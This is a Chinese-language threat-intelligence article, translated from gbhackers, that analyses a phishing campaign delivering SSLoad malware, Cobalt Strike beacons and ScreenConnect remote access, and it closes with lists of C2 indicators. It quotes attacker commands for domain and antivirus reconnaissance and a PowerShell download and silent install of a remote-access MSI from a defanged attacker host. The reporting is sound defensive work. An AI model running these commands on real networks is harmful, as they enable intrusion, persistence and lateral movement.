---
title: 新的 SSLoad 恶意软件与劫持整个网络域的工具相结合
url: https://www.4hou.com/posts/nmB7
source: 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com
date: 2024-05-29
fetch_date: 2025-10-06T16:48:38.432685
---

# 新的 SSLoad 恶意软件与劫持整个网络域的工具相结合

新的 SSLoad 恶意软件与劫持整个网络域的工具相结合 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com

[![](https://www.4hou.com/sihou/images/new4hou/newlogoss.png)](https://www.4hou.com)

* [首页](https://www.4hou.com)
* [企业中心](https://www.4hou.com/corp/newindex)
* [产业研究院](https://www.4hou.com/real-time)

![](https://www.4hou.com/sihou/images/new4hou/search-icon.png)

[投稿](https://www.4hou.com/contribute)

[登录](https://www.4hou.com/login)
  |
[注册](https://www.4hou.com/register)

* 导读 ▾
* [活动](https://www.4hou.com/newticket)
* [专题](https://www.4hou.com/category/special)
* [图谱](https://www.4hou.com/atlas/index)
* [报告](https://www.4hou.com/new-report-info)
* [嘶票](https://www.4hou.com/tickets)
* [嘶货](https://www.4hou.com/shop)
* [企业查询](https://www.4hou.com/corp/new-search-company)
* [招聘](https://www.4hou.com/recruit)![](https://www.4hou.com/sihou/images/1561626446625934.png)

* [新闻](https://www.4hou.com/category/news)
* [行业](https://www.4hou.com/category/industry)
* [趋势](https://www.4hou.com/category/observation)
* [访谈](https://www.4hou.com/category/people)
* [漏洞](https://www.4hou.com/category/vulnerable)
* [WEB安全](https://www.4hou.com/category/web)
* [业务安全](https://www.4hou.com/category/business)
* [系统安全](https://www.4hou.com/category/system)
* [内网渗透](https://www.4hou.com/category/penetration)
* [勒索软件](https://www.4hou.com/category/typ)
* [安全工具](https://www.4hou.com/category/tools)

# 新的 SSLoad 恶意软件与劫持整个网络域的工具相结合

山卡拉
[技术](https://www.4hou.com/category/technology)
2024-05-28 12:00:00

![](https://img.4hou.com/article/%E6%B5%8F%E8%A7%88.png)173354

收藏

导语：FROZEN#SHADOW 被发现采用了一种新的攻击活动，该活动利用 SSLoad 恶意软件进行操作，并利用 Cobalt Strike Implants 来控制和接管整个网络。

FROZEN#SHADOW 被发现采用了一种新的攻击活动，该活动利用 SSLoad 恶意软件进行操作，并利用 Cobalt Strike Implants 来控制和接管整个网络。

此外，威胁分子还使用 ScreenConnect RMM 等远程监控和管理软件进行进一步控制。

SSLoad 是一种精心设计的恶意软件，可以秘密渗透系统、收集敏感信息，并将收集到的信息泄露给恶意软件操作者。

此外，该恶意软件还利用多个后门和有效负载来逃避检测并保持持久性。

**技术分析**

这种新的攻击活动从包含恶意链接的传统网络钓鱼电子邮件开始。

当用户访问此链接时，它会将他们重定向到 mmtixmm[.]org URL 到另一个下载站点，在该站点将 JavaScript 文件下载到受害者计算机。如果手动执行此 JavaScript 文件，它会执行多项操作，在受害者计算机上下载并执行更多有效负载。

这些网络钓鱼电子邮件活动的目标似乎是随机的，因为受害者分布在多个国家，包括亚洲、欧洲和美洲。

对恶意软件的进一步调查表明，攻击发生在以下不同阶段：

**·**第 1 阶段：初始执行 – JavaScript

**·**第 2 阶段：MSI 文件执行

**·**第 3 阶段：恶意软件执行

**·**第 4 阶段：钴击执行

**·**第 5 阶段：RMM 软件和横向移动

**第 1 阶段：初始执行 – JavaScript**

此初始阶段涉及手动执行 JavaScript 文件。通过分析 JS 文件 out\_czlrh.js，发现它由 97.6% 的注释代码组成，其中包含随机字符以混淆文件。然而，删除注释代码后会发现一段非常清晰的 JS 代码，没有任何混淆。

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240430/1714457703182659.png "1714455694540873.png")

具有多个注释代码的 JS 文件代码

在分析 JS 代码时，我们发现 JS 文件执行多个操作，首先为 WScript.Network 和 Scripting.FileSystemObject 创建 ActiveXObject 实例。

此后，包含“GetObject(“winmgmts:\\.\root\cimv2”)”的 JS 代码尝试访问 WMI 对象以进行简单的命令行操作。

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240430/1714457704160331.png "1714455774914314.png")

从 JS 代码中删除注释后清理代码

此外，代码还设置变量来管理连接尝试次数并收集网络共享的连接状态。

该脚本还将所有可用驱动器映射到位于 \wireoneinternet[.]info@80\share\ 的网络共享。JS 代码还通过 WMI 执行“net use”命令以正确映射网络驱动器。

成功完成所有这些步骤后，脚本将构造一个命令，使用 msiexec.exe 从映射的网络驱动器安装 MSI 包 (slack.msi)。

**第 2 阶段：MSI 执行**

此 slack.msi 文件与 TrickBot 恶意软件团伙经常使用的 BazarBackdoor 类似。该恶意软件能够过滤网络并部署额外的有效负载。但是，执行此 slack.msi 文件后，恶意软件会与多个域进行通信。

```
· wireoneinternet[.]info
· skinnyjeanso[.]com
· titnovacrion[.]top
· Maramaravilha[.]com
· globalsolutionunlimitedltd[.]com
```

此外，只有在此之后，SSLoad 恶意软件才会下载并执行。

SSLoad 的有效负载由一个半随机命名的 DLL 文件组成，该文件位于 %APPDATA%\local\digistamp\mbae-api-na.dll 中。然而，该 DLL 由 Rundll32.exe 执行，之后 DLL 将自身复制到 %APPDATA%\Custom\_update\。

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240430/1714457705500548.png "1714457615270798.png")

**第 3 阶段：恶意软件执行**

除了前一阶段之外，rundll32.exe 命令的执行还将开始与两个预配置的 C2 服务器通信，即 hxxps://skinnyjeanso[.]com/live/ 和 hxxps://titnovacrion[.]top/live/. Following this。此后，恶意软件开始使用 cmd.exe 命令收集本地主机的系统和用户数据以及域相关信息。

```
· exe /c ipconfig /all
· exe /c systeminfo
· exe /c nltest /domain_trusts
· exe /c nltest /domain_trusts /all_trusts
· exe /c net view /all /domain
· exe /c net view /all
· exe /c net group “domain admins” /domain
· exe /c wmic.exe /node:localhost /namespace:\\root\securitycenter2 path antivirusproduct get * /format:list
· exe /c net config workstation
· exe /c wmic.exe /node:localhost /namespace:\\root\securitycenter2 path antivirusproduct get displayname | findstr /v /b /c:displayname || echo no antivirus installed
· exe /c whoami /groups
```

然后，这些收集到的信息将通过 HTTPS 连接发送到 C2 服务器。一旦威胁分子从受感染的系统收到此信息，他们就会在确认该信息来自合法服务器而不是来自蜜罐后开始执行一些手动命令。威胁分子执行的手动命令如下：

```
· exe -c “[console]::outputencoding = [console]::inputencoding = [system.text.encoding]::getencoding(‘utf-8’); cd c:\; powershell”
· exe /groups
· exe group “domain admins”/dom
· exe /node:localhost /namespace:\\root\securitycenter2 path antivirusproduct get * /format:list
```

执行这些命令是为了操纵和探测服务器环境以进行下一阶段的恶意软件活动。

**第 4 阶段：钴打击信标**

此阶段的恶意软件涉及在执行手动命令后在系统上部署 Cobalt Strike 信标。一旦部署该信标，它就成为 C2 的主要通信手段。但是，该信标将通过 rundll32.exe 命令删除并执行。

```
·Rundll32.exe C:\ProgramData\msedge.dll,MONSSMRpgaTQssmrpgatq
```

此外，威胁分子还使用 Cobalt Strike 下载并安装 ScreenConnect RMM 软件实例。

```
· exe /c whoami /groups
· exe /c wmic /node:localhost /namespace:\\root\securitycenter2 path antivirusproduct get * /format:list
· exe /c iwr -uri “hxxps://t0talwar.screenconnect[.]com/bin/screenconnect.clientsetup.msi?e=access&y=guest&c=&c=tjx-usa.com&c=&c=dc&c=&c=&c=&c=” -outfile c:\programdata\msedgeview.msi
· exe /c systeminfo
· exe /c msiexec.exe /i C:\ProgramData\Msedgeview.msi /quiet /qn
```

**第 5 阶段：RMM 软件和横向移动**

每个受感染的系统均由 ScreenConnect RMM 软件控制，以保持对系统的完全控制。然而，在此之后，横向移动将通过获取凭证和其他关键系统详细信息进行。环境的枚举是使用多个 PowerShell 命令完成的。

执行凭据提取后，他们还可以获得域管理员帐户 NTLM 哈希。

**IOC**

**C2地址**

```
85.239.54[.]190
23.159.160[.]88
23.95.209[.]148
45.95.11[.]134
bjSdg0.pintaexoticfashion.co[.]in
l1-03.winupdate.us[.]to
23-95-209-148-host.colocrossing[.]com:443
mmtixmm[.]org
wireoneinternet[.]info
skinnyjeanso[.]com
titnovacrion[.]top
simplyfitphilly[.]com
kasnackamarch[.]info
sokingscrosshotel[.]com
danteshpk[.]com
stratimasesstr[.]com
winarkamaps[.]com
globalsolutionunlimitedltd[.]com
maramaravilha[.]com
krd6[.]com
hxxps://t0talwar.screenconnect[.]com
```

本文翻译自：https://gbhackers.com/ssload-network-domination/如若转载，请注明原文地址

* 分享至

![取消](https://www.4hou.com/sihou/images/close.jpg)
![嘶吼](https://www.4hou.com/sihou/images/logo.png)

感谢您的支持，我会继续努力的!

![扫码支持]( "扫一扫")

打开微信扫一扫后点击右上角即可分享哟

### 发表评论

评论

![](https://www.4hou.com/captcha/flat?ztlA7ZuD)

#### 你可能感兴趣的

* [![]()

  新型钓鱼即服务平台VoidProxy：瞄准微软365与谷歌账户 可绕过第三方SSO防护](https://www.4hou.com/posts/om1K)
* [![]()

  ArmouryLoader加载器的全面分析——典型加载器家族系列分析五](https://www.4hou.com/posts/xyE9)
* [![]()

  Darka5恶意家族样本分析](https://www.4hou.com/posts/jBmR)
* [![]()

  NimDoor加密盗窃macOS恶意软件被删除后会自动恢复](https://www.4hou.com/posts/qoEG)
* [![]()

  前瞻对抗｜这大概是首次，AI挖出了Linux内核可利用0day](https://www.4hou.com/posts/6MAV)
* [![]()

  攻防速写｜一条微信消息，实现客户端持久化攻击](https://www.4hou.com/posts/5MzK)

![](https://img.4hou.com/FjC8MmzrcnfY_rzJyoXU2_G-O0i9)

# [山卡拉](https://www.4hou.com/member/azxO)

这个家伙很懒,什么也没说!

#### 最新文章

* [新型钓鱼即服务平台VoidProxy：瞄准微软365与谷歌账户 可绕过第三方SSO防护](https://www.4hou.com/posts/om1K)
  2025-09-17 12:00:00
* [ArmouryLoader加载器的全面分析——典型加载器家族系列分析五](https://www.4hou.com/posts/xyE9)
  2025-07-28 11:41:32
* [Darka5恶意家族样本分析](https://www.4hou.com/posts/jBmR)
  2025-07-24 14:04:33
* [NimDoor加密盗窃macOS恶意软件被删除后会自动恢复](https://www.4hou.com/posts/qoEG)
  2025-07-15 12:00:00

[查看更多](https://www.4hou.com/member/azxO)

# 相关热文

* [新型钓鱼即服务平台VoidProxy：瞄准微软365与谷歌账户 可绕过第三方SSO防护](https://www.4hou.com/posts/om1K)

  胡金鱼
* [ArmouryLoader加载器的全面分析——典型加载器家族系列分析五](https://www.4hou.com/posts/xyE9)

  安天
* [Darka5恶意家族样本分析](https://www.4hou.com/posts/jBmR)

  企业资讯
* [NimDoor加密盗窃macOS恶意软件被删除后会自动恢复](https://www.4hou.com/posts/qoEG)

  胡金鱼
* [前瞻对抗｜这大概是首次，AI挖出了Linux内核可利用0day](https://www.4hou.com/posts/6MAV)

  企业资讯
* [攻防速写｜一条微信消息，实现客户端持久化攻击](https://www.4hou.com/posts/5MzK)

  企业资讯

![]()

[公司简介](https://www.4hou.com/about?title=公司简介)
|
[我要投稿](https://www.4hou.com/about?title=我要投稿)
|
[更新日志](https://www.4hou.com/about?title=更新日志)
|
[友情链接](https://w...